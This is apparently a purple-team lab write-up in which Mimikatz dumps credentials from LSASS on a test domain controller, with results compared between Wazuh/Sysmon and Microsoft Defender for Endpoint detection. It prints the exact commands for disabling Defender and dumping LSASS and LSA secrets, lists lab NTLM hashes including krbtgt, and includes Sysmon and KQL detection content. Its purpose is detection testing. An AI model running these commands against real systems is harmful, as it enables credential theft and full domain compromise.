# Scenario 06 — Mimikatz Credential Dumping

## Objective
Execute Mimikatz on a Windows Server Domain Controller to simulate credential dumping
via LSASS memory access. Validate detection capability across Wazuh/Sysmon and
Microsoft Defender for Endpoint (MDE).

---

## Attack Stages
| Stage | Activity |
|---|---|
| 1 | Disable Windows Defender real-time protection |
| 2 | Execute Mimikatz and request SeDebugPrivilege |
| 3 | Dump credentials from LSASS via sekurlsa::logonpasswords |
| 4 | Dump LSA secrets via lsadump::lsa /patch |

---

## Environment
| Component | Description |
|---|---|
| Target | Windows Server 2022 Domain Controller |
| Tool | Mimikatz v2.2.0 |
| SIEM | Wazuh + Sysmon |
| EDR | Microsoft Defender for Endpoint P2 |
| User context | LAB\Administrator |

---

## MITRE ATT&CK Coverage
| Technique | ID |
|---|---|
| OS Credential Dumping: LSASS Memory | T1003.001 |
| Access Token Manipulation | T1134 |
| Security Support Provider | T1547.005 |
| Disable or Modify Tools | T1562.001 |

---

## Commands Executed
```powershell
# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Run Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
exit
```

---

## Credentials Dumped

### From sekurlsa::logonpasswords
| Account | Type | Value |
|---|---|---|
| LAB\Administrator | NTLM | cee76b5a4220eb5d6f737974e9b0f30c |
| WIN-FAOMJMK7SE9$ | NTLM | 307e741670cd8e71cfb518814a09eb49 |

### From lsadump::lsa /patch
| Account | RID | NTLM |
|---|---|---|
| Administrator | 500 | cee76b5a4220eb5d6f737974e9b0f30c |
| krbtgt | 502 | 2e516d5d7e977cad13579bdb1df5a743 |
| testuser | 1103 | 654eca497b711dd5c43274c5dce53bed |
| adminuser | 1104 | 383fe399326a954a97f73781553ae73d |
| testuser123 | 1106 | 2b576acbe6bcfda7294d6bd18041b8fe |

### Critical Finding
**krbtgt hash obtained** — enables Golden Ticket attack giving permanent
domain admin access (T1558.001)

---

## Detection 1 — Wazuh + Sysmon

### Sysmon Configuration Required
Added LSASS monitoring to Sysmon config:
```xml
<ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
</ProcessAccess>
```

### Event Generated
| Field | Value |
|---|---|
| Event ID | 10 — Process Access |
| Source Image | C:\tools\mimi\x64\mimikatz.exe |
| Target Image | C:\Windows\system32\lsass.exe |
| Granted Access | 0x1010 — Read process memory |
| Source User | LAB\Administrator |
| Target User | NT AUTHORITY\SYSTEM |

### Wazuh Alert
| Field | Value |
|---|---|
| Rule ID | 92900 |
| Level | 12 (High) |
| Description | Lsass process was accessed by mimikatz.exe with read permissions, possible credential dump |
| MITRE | T1003.001 — LSASS Memory |
| Tactic | Credential Access |

---

## Detection 2 — Microsoft Defender for Endpoint

### Advanced Hunting — Mimikatz Process
```kusto
DeviceProcessEvents
| where Timestamp > ago(1h)
| where FileName == "mimikatz.exe"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

Result: mimikatz.exe launched from **powershell.exe**

### MDE Alerts Generated
| Alert | Severity | Category |
|---|---|---|
| Hands-on keyboard attack from compromised account | High | Lateral Movement |
| Malicious credential theft tool execution detected | High | Credential access |
| Mimikatz credential theft tool | High | Credential access |
| LSASS process memory modified | High | Credential access |
| Suspicious access to LSASS service | High | Credential access |
| malware was on a domain controller | High | Malware |
| Potential human-operated malicious activity | High | Suspicious activity |

### MDE Incident Summary
| Field | Value |
|---|---|
| Incident ID | 2 |
| Priority score | 100 (Maximum) |
| Active alerts | 10/14 |
| Categories | 5 |
| Tags | Lateral Movement, Attack Disruption |
| MITRE tactics | T1003.001, T1134, T1547.005 |
| Automated response | Account containment initiated |

---

## Attack Timeline
| Time | Stage | Activity | Wazuh | MDE |
|---|---|---|---|---|
| T+0 | 1 | Defender disabled | ❌ | ✅ |
| T+1 | 2 | Mimikatz executed | ✅ | ✅ |
| T+2 | 3 | LSASS accessed | ✅ Event ID 10 | ✅ |
| T+3 | 4 | Credentials dumped | ✅ Rule 92900 | ✅ |
| T+4 | — | MDE auto-contained account | N/A | ✅ |

---

## Wazuh vs MDE Comparison
| Feature | Wazuh | MDE |
|---|---|---|
| LSASS access detection | ✅ Event ID 10 | ✅ Automatic |
| Mimikatz named detection | ✅ via sourceImage | ✅ Named alert |
| MITRE tagging | ✅ T1003.001 | ✅ Multiple tactics |
| Automated response | ❌ | ✅ Account containment |
| Incident correlation | ❌ Manual | ✅ Automatic |
| Priority scoring | ❌ | ✅ Score 100 |

---

## Investigation Goals
1. Execute credential dumping using Mimikatz
2. Detect LSASS access via Sysmon Event ID 10
3. Validate Wazuh built-in rule 92900
4. Observe MDE automated incident creation
5. Compare detection capability between Wazuh and MDE
6. Document obtained credentials as IOCs

---

## Outcome
The attack successfully:
- Dumped NTLM hashes for all domain accounts
- Obtained krbtgt hash enabling Golden Ticket attacks
- Triggered Wazuh Rule 92900 with MITRE T1003.001 tagging
- Generated 10 MDE alerts including automatic account containment
- Created Priority 100 incident in MDE

This validates:
- Sysmon LSASS monitoring configuration
- Wazuh built-in credential dumping detection
- MDE enterprise EDR detection and response
- Side-by-side SIEM vs EDR detection comparison

---

## Evidence
- `logs/scenario06_wazuh_event10.json` — Wazuh Event ID 10 alert
- `logs/scenario06_mde_incidents.csv` — MDE incidents export
- `screenshots/scenario06_wazuh_event10.png` — Wazuh alert details
- `screenshots/scenario06_wazuh_alert_list.png` — Wazuh alert list
- `screenshots/scenario06_mde_mimikatz.png` — MDE Advanced Hunting
- `screenshots/scenario06_mde_incidents.png` — MDE incidents list
- `screenshots/scenario06_mde_incident_detail.png` — MDE incident graph

---

## References
- [T1003.001](https://attack.mitre.org/techniques/T1003/001/)
- [T1134](https://attack.mitre.org/techniques/T1134/)
- [T1547.005](https://attack.mitre.org/techniques/T1547/005/)
- [T1562.001](https://attack.mitre.org/techniques/T1562/001/)
